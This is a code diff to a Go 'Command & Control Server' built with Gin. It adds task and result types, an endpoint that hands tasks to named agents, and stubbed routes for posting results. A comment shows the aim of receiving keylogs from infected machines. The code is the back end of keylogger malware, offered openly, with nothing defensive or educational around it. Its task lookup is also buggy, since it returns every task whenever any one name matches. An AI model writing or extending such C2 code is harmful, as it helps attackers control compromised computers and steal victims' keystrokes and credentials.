@@ -17,7 +17,22 @@ type register struct {
 	Type     string `json:"type"`   // type
 }
 
-var users []register
+type task struct {
+  Name    string  `json:"name"`
+  ID      int     `json:"id"`     // 1 = func ...; 2 = func ...
+  Arg1    string  `json:"arg1"`   // argv[1]
+  Arg2    string  `json:"arg2"`   // argv[2]
+}
+
+type result struct {
+  Name    string  `json:"name"`
+  Status  int     `json:"status"` // 0 = gud; 1 = bad
+  // TODO: find out how to receive the darn keylogs 
+}
+
+var users   []register
+var tasks   []task
+var results []result
 
 func getUsers(c *gin.Context) {
 	c.IndentedJSON(http.StatusOK, users)
@@ -69,12 +84,24 @@ func generateRandomString(n int) string {
 	return string(b)
 }
 
+func fetchTasks(c *gin.Context) {
+  name := c.Param("name")
+
+  for _, a := range tasks {
+    if a.Name == name {
+      c.IndentedJSON(http.StatusOK, tasks)
+      return
+    }
+  }
+  c.IndentedJSON(http.StatusNotFound, gin.H{"message": "could not find any tasks..."})
+}
+
 func main() {
 	var IP string
 	var Port string
 
 	fmt.Println("---------[ Command & Control Server ]---------")
-	fmt.Print("Host IP: ")
+fmt.Print("Host IP: ")
 	fmt.Scanln(&IP)
 	fmt.Print("Host Port: ")
 	fmt.Scanln(&Port)
@@ -84,5 +111,11 @@ func main() {
 	router.GET("/users", getUsers)
 	router.POST("/users", addUser)
 	router.GET("/users/:name", getUserByName)
+  router.GET("/tasks/:name", fetchTasks)
+  /*
+    router.POST("/tasks/:name", postTask)
+    router.GET("/results/:name", getResults)
+    router.POST("/results/:name", postResults)
+  */
 	router.Run(IP + ":" + Port)
 }
